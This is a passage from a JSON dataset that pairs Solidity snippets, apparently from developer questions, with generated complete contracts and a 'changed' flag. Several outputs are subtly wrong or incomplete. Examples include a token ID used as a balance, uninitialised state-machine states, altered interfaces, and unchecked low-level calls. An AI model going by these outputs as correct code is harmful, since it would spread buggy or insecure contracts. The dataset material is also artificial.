        "output": "pragma solidity ^0.8.9;\ncontract TestLoop {\n    uint32[4] public testArray;\n\n    function setArrayWithLoop(uint32[4] calldata array) public {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function setArrayWithoutLoop(uint32[4] calldata array) public {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract NoLoop {\n    uint32[4] public testArray;\n\n    constructor(uint32[4] memory array) {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract Loop {\n    uint32[4] public testArray;\n\n    constructor (uint32[4] memory array) {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\n",
        "changed": 0
    },
    "41.sol": {
        "input": "function go(uint[] calldata amounts, uint16[] calldata destChainIds, bytes[] calldata destinations) public payable {\n    uint length = 2;\n    for (uint i; i < length; i++) {\n        SendToken(amounts[i], destChainIds[i], destinations[i]);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenTransfer {\n    event SendToken(uint amount, uint16 destChainId, bytes destination);\n\n    function go(uint[] calldata amounts, uint16[] calldata destChainIds, bytes[] calldata destinations) public payable {\n        uint length = amounts.length;\n\n        for (uint i = 0; i < length; i++) {\n            emit SendToken(amounts[i], destChainIds[i], destinations[i]);\n        }\n    }\n}\n\n",
        "changed": 1
    },
    "42.sol": {
        "input": "...\nuint256 tokenId = _tokenIdCounter.current();\nrequire(tokenId <= MAX_SUPPLY, \"All NFTs have been minted\") \n_tokenIdCounter.increment();\n_safeMint(to, tokenId);\n...\n\n...\nuint256 tokenId = _tokenIdCounter.current();\nrequire(tokenId <= MAX_SUPPLY, \"All NFTs have been minted\"); \n_tokenIdCounter.increment();\n_safeMint(to, tokenId);\n...\n\n\n",
        "output": "",
        "changed": 0
    },
    "43.sol": {
        "input": "contract Lab03 is Interface{\n    mapping(address => Person) mapPerson;\n    mapping(address => Company) mapCompany;\n\n    Person p;\n    Company c;\n ...\n\n\npragma solidity ^0.7.0;\n\nstruct Person{\n    address addr;\n    string name;\n    string surname;\n}\n\nstruct Company{\n    address addr;\n    string name;\n}\n\n\ninterface Interface{\n\n    function addPerson(address addr, string memory name, string memory surname) external;\n    \n    function addCompany(address addr, string memory name) external;\n\n    function getPerson(address addrFind) external view returns (address addr);\n\n    function getCompany(address addrFind) external view returns (address addr);\n}\n    \n\nlibrary Lib{\n    struct LibPerson {\n        mapping(address => Person) mapPerson;\n    }\n\n    struct LibCompany {\n        mapping(address => Company) mapCompany;\n    }\n\n    function addPerson(LibPerson storage lp, address addr, string memory name, string memory surname) public{\n        addr = msg.sender;\n        lp.mapPerson[addr] = Person(addr, name, surname);\n    }\n\n    function addCompany(LibCompany storage lc, address addr, string memory name) public{\n        addr = msg.sender;\n        lc.mapCompany[addr] = Company(addr, name);\n    }    \n\n    function getCompany(LibCompany storage lc, address addrFind) view external returns(address){\n        return lc.mapCompany[addrFind].addr;\n    }   \n\n    function getPerson(LibPerson storage lp, address addrFind) view external returns(address){\n        return lp.mapPerson[addrFind].addr;\n    }     \n}\n\ncontract Lab03 is Interface{\n    Lib.LibPerson libP;\n    Lib.LibCompany libC;\n    Person p;\n    Company c;\n\n    function addPerson(address addr, string memory name, string memory surname) public override {\n        Lib.addPerson(libP, addr, name, surname);\n        emit addPersonEvent(addr, name, surname);\n    }\n\n    function addCompany(address addr, string memory name) public override{\n        Lib.addCompany(libC, addr, name);\n        emit addCompanyEvent(addr, name);\n    }\n\n    function getPerson(address _addressFind) public override view returns (address addr) {\n        return Lib.getPerson(libP, _addressFind);\n    }\n\n    function getCompany(address _addressFind) public override view returns (address addr) {\n        return Lib.getCompany(libC, _addressFind);\n    }\n\n    event addPersonEvent(address addr, string name, string surname);\n    event addCompanyEvent(address addr, string name);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Interface {\n    function addPerson(address addr, string calldata name, string calldata surname) external;\n    function addCompany(address addr, string calldata name) external;\n    function getPerson(address addrFind) external view returns (string memory name, string memory surname);\n    function getCompany(address addrFind) external view returns (string memory name);\n}\n\n",
        "changed": 0
    },
    "44.sol": {
        "input": "mapping(address => experience) experiences;\n\nfunction addExperience(...) public {\n    experiences[_addressCompagnie] = experience(...);\n}\n\nmapping(address => experience[]) experiences;\n\nfunction addExperience(...) public {\n    experiences[_addressCompagnie].push(experience(...));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ExperienceContract {\n    struct Experience {\n        string jobTitle;\n        string company;\n        uint256 startDate;\n        uint256 endDate;\n    }\n\n    mapping(address => Experience) experiencesSingle;\n    mapping(address => Experience[]) experiencesMultiple;\n\n    function addSingleExperience(\n        address _address,\n        string memory _jobTitle,\n        string memory _company,\n        uint256 _startDate,\n        uint256 _endDate\n    ) public {\n        experiencesSingle[_address] = Experience(_jobTitle, _company, _startDate, _endDate);\n    }\n\n    function addMultipleExperience(\n        address _address,\n        string memory _jobTitle,\n        string memory _company,\n        uint256 _startDate,\n        uint256 _endDate\n    ) public {\n        experiencesMultiple[_address].push(Experience(_jobTitle, _company, _startDate, _endDate));\n    }\n\n    function getSingleExperience(address _address) public view returns (string memory, string memory, uint256, uint256) {\n        Experience memory exp = experiencesSingle[_address];\n        return (exp.jobTitle, exp.company, exp.startDate, exp.endDate);\n    }\n\n    function getMultipleExperience(address _address) public view returns (Experience[] memory) {\n        return experiencesMultiple[_address];\n    }\n}\n\n",
        "changed": 0
    },
    "45.sol": {
        "input": "contract MyContract {\n    uint256 protected myVar;\n}\n\nconst myVar = await web3.eth.getStorageAt(contractAddress, slotNumber);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public myVar;\n\n    function setMyVar(uint256 _myVar) public {\n        myVar = _myVar;\n    }\n\n    function getMyVar() public view returns (uint256) {\n        return myVar;\n    }\n}\n\n",
        "changed": 0
    },
    "46.sol": {
        "input": "function withdraw(address _recipient) public payable onlyOwner {\n    payable(_recipient).transfer(address(this).balance);\n}\n\nbooking_contract.functions.withdraw(recipient_address)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BookingContract {\n    address public owner;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only the contract owner can call this\");\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function withdraw(address payable _recipient) public onlyOwner {\n        require(address(this).balance > 0, \"Contract has no money\");\n        _recipient.transfer(address(this).balance);\n    }\n\n    fallback() external payable {\n        // The contract can receive money.\n    }\n}\n\n",
        "changed": 0
    },
    "47.sol": {
        "input": "mapping(uint => uint[]) Singer;\nmapping(uint => uint[]) Event;\nuint public n_singers;\nuint public n_events;\n\nfunction CreateEvent(uint singer_id) external {\n    if(singer_id > n_singers) {\n        revert SingerIdError(singer_id);\n    }\n    else if (singer_id == n_singers) {\n        n_singers ++;\n        Singer[singer_id].push(n_events); \n        Event[n_events].push(singer_id);\n    } else {\n        Singer[singer_id].push(n_events);\n    }\n    n_events++;\n}`\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MusicEvent {\n    mapping(uint => uint[]) public Singer;\n    mapping(uint => uint[]) public Event;\n    uint public n_singers;\n    uint public n_events;\n\n    event SingerIdError(uint singer_id);\n\n    constructor() {\n        n_singers = 0;\n        n_events = 0;\n    }\n\n    function CreateEvent(uint singer_id) external {\n        if(singer_id > n_singers) {\n            emit SingerIdError(singer_id);\n        }\n        else if (singer_id == n_singers) {\n            n_singers ++;\n            Singer[singer_id].push(n_events);\n            Event[n_events].push(singer_id);\n        } else {\n            Singer[singer_id].push(n_events);\n            Event[n_events].push(singer_id);\n        }\n        n_events++;\n    }\n}\n\n",
        "changed": 0
    },
    "48.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/KeeperCompatible.sol\";\n\ncontract Counter is KeeperCompatibleInterface {\n    \n    uint public counter;\n\n    \n    uint public immutable interval;\n    uint public lastTimeStamp;\n\n    constructor(uint updateInterval) {\n      interval = updateInterval;\n      lastTimeStamp = block.timestamp;\n\n      counter = 0;\n    }\n\n    function checkUpkeep(bytes calldata \n) {\n        upkeepNeeded = (block.timestamp - lastTimeStamp) > interval;\n    }\n\n    function performUpkeep(bytes calldata \n) external override {\n        if ((block.timestamp - lastTimeStamp) > interval ) {\n            lastTimeStamp = block.timestamp;\n            counter = counter + 1;\n        }\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "49.sol": {
        "input": "    require(balanceOf[msg.sender] >= _value, 'The account has low funds');\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    // Mapping from account addresses to current balance.\n    mapping(address => uint256) public balanceOf;\n\n    // Event triggered when tokens are transferred.\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    // Initializes contract with initial supply tokens to the creator of the contract.\n    constructor(uint256 initialSupply) {\n        balanceOf[msg.sender] = initialSupply;   // Assign all initial tokens to the contract creator.\n    }\n\n    // Transfer tokens from the sender's account to a given account.\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value, 'The account has low funds');\n        balanceOf[msg.sender] -= _value;         // Subtract from the sender.\n        balanceOf[_to] += _value;                // Add to the recipient.\n        emit Transfer(msg.sender, _to, _value);  // Trigger transfer event.\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "50.sol": {
        "input": "cur = state(cur).func(uint c);\n\nbyte c; \ncur = state(cur).func(c);\n\nfor (uint i = 0; i < bytes(input).length; i++) {\n  uint8 c = uint8(bytes(input)[i]);\n\n  if (cur == 0) {\n    return false;\n  }\n}\n\nstruct State {\n    bool accepts;\n    function (byte) internal pure returns (uint) func;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StateMachine {\n    struct State {\n        bool accepts;\n        function (bytes1) internal pure returns (uint) func;\n    }\n\n    State[] private states;\n    uint private cur;\n\n    constructor() public {\n        // Initialize states and functions\n    }\n\n    function process(bytes memory input) public returns (bool) {\n        for (uint i = 0; i < input.length; i++) {\n            bytes1 c = bytes1(input[i]);\n            cur = states[cur].func(c);\n\n            if (cur == 0) {\n                return false;\n            }\n        }\n        return states[cur].accepts;\n    }\n}\n\n",
        "changed": 0
    },
    "51.sol": {
        "input": "function foo(string calldata _str) public pure returns (string calldata) {\n    return _str;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo(string calldata _str) public pure returns (string memory) {\n        return _str;\n    }\n}\n\n",
        "changed": 0
    },
    "52.sol": {
        "input": "event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleTokenContract {\n    mapping(address => uint256) public balanceOf;\n    \n    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n    constructor(uint256 initialSupply) public {\n        balanceOf[msg.sender] = initialSupply;\n    }\n\n    function transfer(address _to, uint256 _tokenId) public {\n        require(balanceOf[msg.sender] >= _tokenId);\n        require(balanceOf[_to] + _tokenId >= balanceOf[_to]);\n\n        balanceOf[msg.sender] -= _tokenId;\n        balanceOf[_to] += _tokenId;\n\n        emit Transfer(msg.sender, _to, _tokenId);\n    }\n}\n\n",
        "changed": 1
    },
    "53.sol": {
        "input": "ERC721(nftAddress).safeTransferFrom(msg.sender, address(this), tokenID);\n\nreturn (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n\n\n    \n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual override returns (bool) {\n        require(_exists(tokenId), \"ERC721: operator query for nonexistent token\");\n        address owner = ERC721.ownerOf(tokenId);\n        console.log(\"spender %s\", spender);\n        console.log(\"getApproved %s\", getApproved(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "55.sol": {
        "input": "    for (uint256 i = 0; i < _balances.length; i++) {\n      newContract.setBalance(_balances[i], _balances[_balances[i]]);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NewContract {\n    mapping(address => uint256) public balances;\n\n    function setBalance(address _address, uint256 _balance) public {\n        balances[_address] = _balance;\n    }\n}\n\ncontract MainContract {\n    address[] private _addresses;\n    uint256[] private _balances;\n    NewContract private newContract;\n\n    constructor(NewContract _newContract) public {\n        newContract = _newContract;\n    }\n\n    function setBalancesInNewContract() public {\n        require(_addresses.length == _balances.length, \"Addresses and balances array length must be same.\");\n\n        for (uint256 i = 0; i < _balances.length; i++) {\n            newContract.setBalance(_addresses[i], _balances[i]);\n        }\n    }\n\n    function addBalance(address _address, uint256 _balance) public {\n        _addresses.push(_address);\n        _balances.push(_balance);\n    }\n}\n\n",
        "changed": 0
    },
    "56.sol": {
        "input": "  import './ERC165.sol'; \n  import './IERC721.sol'; \n\n  import '/.ERC165.sol'; \n  import '/.IERC721.sol'; \n\n\n",
        "output": "",
        "changed": 0
    },
    "58.sol": {
        "input": "uint256 id = investLength++;\n\nuint256 id = ++investLength;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Investment {\n    uint256 public investLength;\n\n    constructor() public {\n        investLength = 0;\n    }\n\n    function increaseInvestLength() public returns(uint256) {\n        uint256 id = investLength++;\n        return id;\n    }\n\n    function increaseInvestLengthPrefix() public returns(uint256) {\n        uint256 id = ++investLength;\n        return id;\n    }\n}\n\n",
        "changed": 0
    },
    "59.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public participants;\n\n    function foo() public {\n        uint amount = 1; \n        for (uint i = 0; i < participants.length; i++) {\n            participants[i].transfer(amount);\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public participants;\n\n    function foo() public {\n        uint amount = 1; // 1 wei\n        for (uint i = 0; i < participants.length; i++) {\n            participants[i].transfer(amount);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "60.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Marketplace {\naddress payable public owner;\nmapping(address => bool) public sellers;\nmapping(uint => Product) public products;\nmapping(address => mapping(uint => bool)) public purchased;\nmapping(address => mapping(uint => bool)) public disputes;\nmapping(address => mapping(uint => bytes32)) public reviews;\nmapping(address => uint) public reputation;\nuint public productId; \n\nstruct Product {\n    address payable seller;\n    uint price;\n    string name;\n    string description;\n}\n\nevent ProductListed(uint productId);\nevent ProductPurchased(uint productId);\nevent DisputeRaised(uint productId);\nevent DisputeResolved(uint productId);\n\nconstructor() {\n    owner = payable(msg.sender);\n}\n\nfunction addSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = true;\n}\n\nfunction removeSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = false;\n}\n\nfunction listProduct(\n    address payable seller, \n    uint price, \n    string memory name,\n    string memory description) public {\n        (sellers[seller]);\n        products[productId] = Product(seller, price, name, description);\n        productId++;\n        emit ProductListed(productId);\n}\n\nfunction purchaseProduct(uint _productId, address buyer) public payable {\n    require(products[_productId].price <= msg.value);\n    require(!purchased[buyer][_productId]);\n    products[_productId].seller.transfer(products[_productId].price);\n    purchased[buyer][_productId] = true;\n    emit ProductPurchased(_productId);\n}\n\nfunction raiseDispute(uint _productId, address buyer) public {\n    require(purchased[buyer][_productId]);\n    disputes[buyer][_productId] = true;\n    emit DisputeRaised(_productId);\n}\n\nfunction resolveDispute(uint _productId, address payable buyer, bool refund) \npublic {\n    require(msg.sender == owner);\n    require(disputes[buyer][productId]);\n    if (refund) {\n        buyer.transfer(products[_productId].price);\n    }\n    disputes[buyer][_productId] = false;\n    emit DisputeResolved(productId);\n}\n\nfunction leaveReview(uint _productId, address buyer, bytes32 review) public {\n    require(purchased[buyer][_productId]);\n    reviews[buyer][_productId] = review;\n}\n\nfunction rateSeller(address seller, uint rating) public {\n    reputation[seller] += rating;\n}\n\nfunction getProduct(uint _productId) public view returns (address payable, uint, \nstring memory, string memory) {\n    return (products[_productId].seller, products[_productId].price, \n    products[_productId].name, products[_productId].description);\n    }\n\nfunction getSellerReputation(address seller) public view returns (uint) {\n    return reputation[seller];\n}\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Marketplace {\naddress payable public owner;\nmapping(address => bool) public sellers;\nmapping(uint => Product) public products;\nmapping(address => mapping(uint => bool)) public purchased;\nmapping(address => mapping(uint => bool)) public disputes;\nmapping(address => mapping(uint => bytes32)) public reviews;\nmapping(address => uint) public reputation;\nuint public productId; \n\nstruct Product {\n    address payable seller;\n    uint price;\n    string name;\n    string description;\n}\n\nevent ProductListed(uint productId);\nevent ProductPurchased(uint productId);\nevent DisputeRaised(uint productId);\nevent DisputeResolved(uint productId);\n\nconstructor() {\n    owner = payable(msg.sender);\n}\n\nfunction addSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = true;\n}\n\nfunction removeSeller(address seller) public {\n    require(msg.sender == owner);\n    sellers[seller] = false;\n}\n\nfunction listProduct(\n    address payable seller, \n    uint price, \n    string memory name,\n    string memory description) public {\n        (sellers[seller]);\n        products[productId] = Product(seller, price, name, description);\n        productId++;\n        emit ProductListed(productId);\n}\n\nfunction purchaseProduct(uint _productId, address buyer) public payable {\n    require(products[_productId].price <= msg.value);\n    require(!purchased[buyer][_productId]);\n    products[_productId].seller.transfer(products[_productId].price);\n    purchased[buyer][_productId] = true;\n    emit ProductPurchased(_productId);\n}\n\nfunction raiseDispute(uint _productId, address buyer) public {\n    require(purchased[buyer][_productId]);\n    disputes[buyer][_productId] = true;\n    emit DisputeRaised(_productId);\n}\n\nfunction resolveDispute(uint _productId, address payable buyer, bool refund) \npublic {\n    require(msg.sender == owner);\n    require(disputes[buyer][productId]);\n    if (refund) {\n        buyer.transfer(products[_productId].price);\n    }\n    disputes[buyer][_productId] = false;\n    emit DisputeResolved(productId);\n}\n\nfunction leaveReview(uint _productId, address buyer, bytes32 review) public {\n    require(purchased[buyer][_productId]);\n    reviews[buyer][_productId] = review;\n}\n\nfunction rateSeller(address seller, uint rating) public {\n    reputation[seller] += rating;\n    // reputation[seller][rater] = rating;\n}\n\nfunction getProduct(uint _productId) public view returns (address payable, uint, \nstring memory, string memory) {\n    return (products[_productId].seller, products[_productId].price, \n    products[_productId].name, products[_productId].description);\n    }\n\nfunction getSellerReputation(address seller) public view returns (uint) {\n    return reputation[seller];\n}\n}\n\n",
        "changed": 0
    },
    "61.sol": {
        "input": "function get() public returns(string memory)  {\n    return value;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string value;\n\n    constructor() {\n        value = \"Initial Value\";\n    }\n\n    function get() public view returns(string memory)  {\n        return value;\n    }\n\n    function set(string memory _value) public {\n        value = _value;\n    }\n}\n\n",
        "changed": 0
    },
    "62.sol": {
        "input": "web3.eth.accounts.wallet.add(\"0xprivateKey\");\n\nawait contract.methods.sendToOwner().send(\n    { from: currentAccount.address, gas: 300000 }\n);\n\nconst web3 = new Web3(window.ethereum);\n\nawait contract.methods.sendToOwner().send(\n    { from: currentAccount.address, gas: 300000 }\n);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function sendToOwner() public payable {\n        require(msg.value > 0, \"You must send some ether\");\n        owner.transfer(msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "63.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    \n    constructor() {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    \n    function getLatestPrice() public view returns (int) {\n        (\n,\n            int price,\n,\n,\n        ) = priceFeed.latestRoundData();\n        return price;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "64.sol": {
        "input": "\npragma solidity 0.6.12;\n\n\ncontract NFT {\n\n    address owner; \n    \n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    mapping (address => bool) public _onlyIfMarketplace;\n\n    function mint() public {\n        require(owner == msg.sender);\n    }\n\n    function transfer() public {\n\n    }\n\n\n    function shuffle() public {\n        require(_onlyIfMarketplace[msg.sender] == true);\n    }\n\n    function setMarketplaceContract(address MarketplaceContract) public {\n        require(owner == msg.sender);\n        _onlyIfMarketplace[MarketplaceContract] = true;\n    }\n}\n\n\ncontract Marketplace {\n\n    NFT nftContract; \n\n    address owner; \n   \n\n    constructor(address nftAddress) public {\n        owner = msg.sender;\n        nftContract = NFT(nftAddress);\n    }\n\n    function changeNFTAddress(address newNFTAddress) public {\n        require(owner == msg.sender);\n        nftContract = NFT(newNFTAddress);\n    }\n\n    function buy() public {\n        nftContract.transfer();\n        nftContract.shuffle();\n    }\n\n}\n\n\n",
        "output": " //SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.6.12;\n\n\ncontract NFT {\n\n    //Ensure that only the owner can call important functions\n    address owner; \n    \n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    mapping (address => bool) public _onlyIfMarketplace;\n\n    function mint() public {\n        require(owner == msg.sender);\n    }\n\n    function transfer() public {\n\n    }\n\n\n    function shuffle() public {\n        require(_onlyIfMarketplace[msg.sender] == true);\n    }\n\n    //You can always add an address that can call this function, \n    //and you can also write another one to remove the address which can call this function\n    function setMarketplaceContract(address MarketplaceContract) public {\n        require(owner == msg.sender);\n        _onlyIfMarketplace[MarketplaceContract] = true;\n    }\n}\n\n\ncontract Marketplace {\n\n    //Call NFT contract\n    NFT nftContract; \n\n     //Ensure that only the owner can call important functions\n    address owner; \n   \n\n    constructor(address nftAddress) public {\n        owner = msg.sender;\n        nftContract = NFT(nftAddress);\n    }\n\n    // You can change the NFT contract you want to call at any time\n    function changeNFTAddress(address newNFTAddress) public {\n        require(owner == msg.sender);\n        nftContract = NFT(newNFTAddress);\n    }\n\n    //Call the function of NFT contract\n    function buy() public {\n        nftContract.transfer();\n        nftContract.shuffle();\n    }\n\n}\n\n",
        "changed": 0
    },
    "66.sol": {
        "input": "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n    external\n    virtual\n    override\n    payable\n    ensure(deadline)\n    returns (uint[] memory amounts)\n{\n\nmodifier ensure(uint deadline) {\n    require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UniswapV2Router {\n    modifier ensure(uint deadline) {\n        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n        _;\n    }\n\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        // Swap logic goes here\n        // This is a placeholder for demo purposes\n        return new uint[](0);\n    }\n}\n\n",
        "changed": 0
    },
    "67.sol": {
        "input": "function transferEther(address receiver) external payable {\n    payable(receiver).call{value: msg.value}(\"\");\n}\n\naddress payable public owner;\n\nfunction transferEther() external payable {\n    owner = payable(msg.sender);\n\n\n    owner.call{value: msg.value}(\"\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function transferEther(address receiver) external payable {\n        require(msg.value > 0, 'No ether provided for transfer');\n        payable(receiver).call{value: msg.value}(\"\");\n    }\n\n    function transferEtherToOwner() external payable {\n        require(msg.value > 0, 'No ether provided for transfer');\n        owner.call{value: msg.value}(\"\");\n    }\n\n    function changeOwner(address newOwner) external {\n        require(msg.sender == owner, 'Only the owner can change ownership');\n        owner = payable(newOwner);\n    }\n}\n\n",
        "changed": 0
    },
    "68.sol": {
        "input": "await token.approve(manager.address, 100000, { from: accounts[1] });\n\nrdk.transferFrom(address(this), msg.sender, howMany); \n\n\nrdk.transfer(msg.sender, howMany); \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    address public owner;\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        owner = msg.sender;\n        token = _token;\n    }\n\n    function approveToken(uint256 amount, address manager) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.approve(manager, amount);\n    }\n\n    function transferFromToken(address from, address to, uint256 amount) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.transferFrom(from, to, amount);\n    }\n\n    function transferToken(address to, uint256 amount) public {\n        require(msg.sender != address(0), \"Invalid sender address\");\n        token.transfer(to, amount);\n    }\n}\n\n",
        "changed": 0
    },
    "69.sol": {
        "input": "  function swapExactETHForTokens(uint amountOutMin, address token) external payable { \n    address[] memory path = new address[](2);\n    path[0] = uniswap.WETH();\n    path[1] = token;\n    uniswap.swapExactETHForTokens{value: msg.value}(\n      amountOutMin, \n      path,\n      msg.sender, \n      now\n    );\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswap {\n    function WETH() external pure returns (address);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);\n}\n\ncontract SwapContract {\n    IUniswap public uniswap;\n\n    constructor(address _uniswap) public {\n        uniswap = IUniswap(_uniswap);\n    }\n\n    function swapExactETHForTokens(uint amountOutMin, address token) external payable { \n        address[] memory path = new address[](2);\n        path[0] = uniswap.WETH();\n        path[1] = token;\n        uniswap.swapExactETHForTokens{value: msg.value}(\n            amountOutMin, \n            path,\n            msg.sender, \n            block.timestamp\n        );\n    }\n}\n\n",
        "changed": 1
    },
    "70.sol": {
        "input": "require(!voters[voter].voted), \"The voter already voted\");\n\nrequire(!voters[voter].voted, \"The voter already voted\");\n\npragma solidity >= 0.6.0 < 0.9.0;\n\ncontract Ballot { \n\n    struct Voter {\n        uint weight;\n        bool voted; \n        address delegate; \n        uint vote; \n    }\n\n    struct Proposal {\n        bytes32 names;\n        uint voteCount;\n    }\n\n    address public chairperson;\n\n    mapping(address => Voter) public voters;\n    Proposal[] public proposals;\n\n    constructor(bytes32[] memory proposalNames) {\n        chairperson = msg.sender;\n\n        voters[chairperson].weight = 1;\n        for(uint i = 0; i > proposalNames.length; i++){\n            proposals.push(Proposal({names:proposalNames[i], voteCount: 0}));\n        }\n    }\n\n    function giveRightToVote(address voter) external {\n        require(msg.sender == chairperson, \"Only chairperson can give right to vote.\");\n        require(!voters[voter].voted, \"The voter already voted\");\n        require(voters[voter].weight == 0);\n        voters[voter].weight = 1;\n    }\n\n    function delegate(address to) external { \n        Voter storage sender = voters[msg.sender];\n        require (sender.weight != 0, \"You have no right to vote\");\n        require(!sender.voted, \"You already voted\");\n        require(to != msg.sender, \"Self-Delegation is not allowed\");\n        \n        while (voters[to].delegate != address(0)){\n            to = voters[to].delegate;\n            require(to != msg.sender, \"Found Loop in Delegation.\");\n        }\n        \n        sender.voted = true;\n        sender.delegate = to;\n        Voter storage delegate_ = voters[to];\n        if(delegate_.voted){\n            proposals[delegate_.vote].voteCount += sender.weight;\n        }else{\n            delegate_.weight += sender.weight;\n        }\n    }\n\n    function vote(uint proposal) external {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"Has no right to vote!\");\n        require(!sender.voted, \"Already voted.\");\n        sender.voted = true;\n        sender.vote = proposal;\n        proposals[proposal].voteCount += sender.weight;\n    }\n\n    function winningProposal() public view returns (uint winningProposal_){\n        uint winningVoteCount = 0;\n        for (uint p = 0; p < proposals.length; p++) {\n            if (proposals[p].voteCount > winningVoteCount){\n                winningVoteCount = proposals[p].voteCount;\n                winningProposal_ = p;\n            }\n        }\n    }\n\n    function winnerName() external view returns (bytes32 winnerName_){\n        winnerName_ = proposals[winningProposal()].names;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ballot {\n\n    struct Voter {\n        uint weight;\n        bool voted;\n        address delegate;\n        uint vote;\n    }\n\n    struct Proposal {\n        bytes32 names;\n        uint voteCount;\n    }\n\n    address public chairperson;\n\n    mapping(address => Voter) public voters;\n    Proposal[] public proposals;\n\n    constructor(bytes32[] memory proposalNames) public {\n        chairperson = msg.sender;\n        voters[chairperson].weight = 1;\n        \n        for(uint i = 0; i < proposalNames.length; i++){\n            proposals.push(Proposal({names:proposalNames[i], voteCount: 0}));\n        }\n    }\n\n    function giveRightToVote(address voter) external {\n        require(msg.sender == chairperson, \"Only chairperson can give right to vote.\");\n        require(!voters[voter].voted, \"The voter already voted\");\n        require(voters[voter].weight == 0);\n        voters[voter].weight = 1;\n    }\n\n    function delegate(address to) external {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"You have no right to vote\");\n        require(!sender.voted, \"You already voted\");\n        require(to != msg.sender, \"Self-Delegation is not allowed\");\n        \n        while(voters[to].delegate != address(0)){\n            to = voters[to].delegate;\n            require(to != msg.sender, \"Found Loop in Delegation.\");\n        }\n        \n        sender.voted = true;\n        sender.delegate = to;\n        Voter storage delegate_ = voters[to];\n        if(delegate_.voted){\n            proposals[delegate_.vote].voteCount += sender.weight;\n        }else{\n            delegate_.weight += sender.weight;\n        }\n    }\n\n    function vote(uint proposal) external {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"Has no right to vote!\");\n        require(!sender.voted, \"Already voted.\");\n        